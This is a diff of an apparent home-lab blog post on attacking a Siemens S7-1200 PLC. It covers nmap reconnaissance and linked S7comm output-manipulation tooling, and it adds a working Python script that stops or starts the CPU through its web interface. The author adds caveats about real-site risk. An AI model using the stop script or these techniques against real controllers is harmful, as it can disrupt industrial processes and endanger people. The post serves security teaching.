@@ -8,23 +8,24 @@ description: "Looking at different attack vectors for the SIEMEN S7-1200 PLC CPU
 
 - [Goals](#goals)
 - [Scanning](#scanning)
-  - [NMAP](#nmap)
-    - [Basic Scan](#basic-scan)
-    - [Port Scan](#port-scan)
-    - [Service Scan](#service-scan)
-    - [Script Scans](#script-scans)
-  - [Attacks](#attacks)
+  - [Basic Scan](#basic-scan)
+  - [Port Scan](#port-scan)
+  - [Service Scan](#service-scan)
+  - [Script Scans](#script-scans)
+- [Attacks](#attacks)
   - [HTTP](#http)
   - [S7comm](#s7comm)
   - [OPC-UA](#opc-ua)
   - [Modbus](#modbus)
+- [Final Thoughts](#final-thoughts)
 
 
 ## Goals
+- Scan our PLC to see what we can learn
+- Attack the different protocols exposed by the PLC
 
 ## Scanning
-### NMAP
-#### Basic Scan
+### Basic Scan
 `nmap -Pn 10.0.0.10`
 
 ```  bash
@@ -38,7 +39,7 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
 ```
 
-#### Port Scan
+### Port Scan
 `nmap -Pn 10.0.0.10 -p 0-65535`
 
 ``` bash
@@ -56,7 +57,7 @@ PORT     STATE    SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 712.71 seconds
 ```
 
-#### Service Scan
+### Service Scan
 `nmap -Pn -sV 10.0.0.10 -p 80,102,443,502,4840`
 
 ``` bash
@@ -83,7 +84,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 166.22 seconds
 ```
 
-#### Script Scans
+### Script Scans
 [S7 Info](https://nmap.org/nsedoc/scripts/s7-info.html)
 `nmap -Pn 10.0.0.10 --script s7-info.nse -p 102`
 ``` bash
@@ -188,10 +189,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 184.99 seconds
 ```
 
-### Attacks
+## Attacks
 https://github.com/moki-ics/s7-metasploit-modules
-
-https://github.com/tijldeneut/ICSSecurityScripts/blob/master/S7-1200-Workshop.py
 
 ### HTTP
 Lets check out the web service running on the PLC. I've configured it to be as insecure as possible.
@@ -200,7 +199,51 @@ When we first access the webpage, we land on the 'Start Page' where we are immed
 
 ![switching off the plc from the web](/blog/res/ot-lab-plc-web-off.gif)
 
-Easy as that!
+Easy as that! We can even script it with a bit of python:
+
+``` python
+#!/usr/bin/env python3
+"""
+Usage:
+    python3 cpu_command.py start 10.0.0.10
+    python3 cpu_command.py stop 10.0.0.10
+"""
+
+import sys
+import requests
+
+def send_command(command: str, ip_address: str, port: int = 80, timeout: int = 5):
+    url = f"http://{ip_address}/CPUCommands"
+    payload = {command: 1,"PriNav":"Start"}
+    headers = {"Referer": f"http://{ip_address}/"}    
+    try:
+        response = requests.post(url, data=payload, timeout=timeout,headers=headers)
+        response.raise_for_status()
+        print(f"Sent '{command}' to {ip_address} - status: {response.status_code}")
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+        return None
+
+def main():
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <Run|Stop> <ip_address>")
+        sys.exit(1)
+
+    command = sys.argv[1].capitalize()
+    ip_address = sys.argv[2]
+
+    if command not in ("Run", "Stop"):
+        print("Error: command must be 'Run' or 'Stop'")
+        sys.exit(1)
+
+    send_command(command, ip_address)
+
+if __name__ == "__main__":
+    main()
+```
+
+![switching the cpu on and off using the python script](/blog/res/ot-lab-plc-http-off-on.gif)
 
 We can also snoop around the webpage to do some data gathering while we're here. We can find out:
 - Serial Number
@@ -211,11 +254,20 @@ We can also snoop around the webpage to do some data gathering while we're here.
 - Any Uploaded Files (including recipes)
 - and so much more!
 
-
 ### S7comm
+We can take advantage of the S7comm protocol to manipulate the digital outputs at will.
+Using [this](https://github.com/tijldeneut/ICSSecurityScripts/blob/master/S7-1200-Workshop.py) script, we can simply decide which outputs we want on and off, and run it.
+
+![switching on and off all the DIs using the script](/blog/res/ot-lab-plc-s7comm-attack.gif)
+
+**However, a caveat.** For the above demo, I put a blank project onto the PLC - removing all the ladder logic I'd be using before. I did this because, when my ladder logic was loaded, this attack didn't actually work. This is because the ladder logic instantly overwrote the adhoc input, nullifying the attack. This is a good point to remind you that articles like this, and many, many others, do not always reflect the reality of risk on site. Yes, OT sites are filled with unpatched devices, ancient operating systems, and bad network segmentation, but they are also extremly complex in their own right, with things like ladder logic and saftey systems that are not understood at all by folk in IT, or more traditional cyber security. Therefore, don't always let yourself be taken in by flashy attacks like the above. 
 
 ### OPC-UA
-See OPC-UA article
+We dove deeper into OPC-UA in a previous article where we looked at how bad authentication practice could lead to tags being written to by strangers. Check if out [here](https://cdino.net/blog/2026/ot-lb-opc-ua-scanner) to see more.
 
 ### Modbus
 See Modbus MITM article
+TODO
+
+## Final Thoughts
+TODO
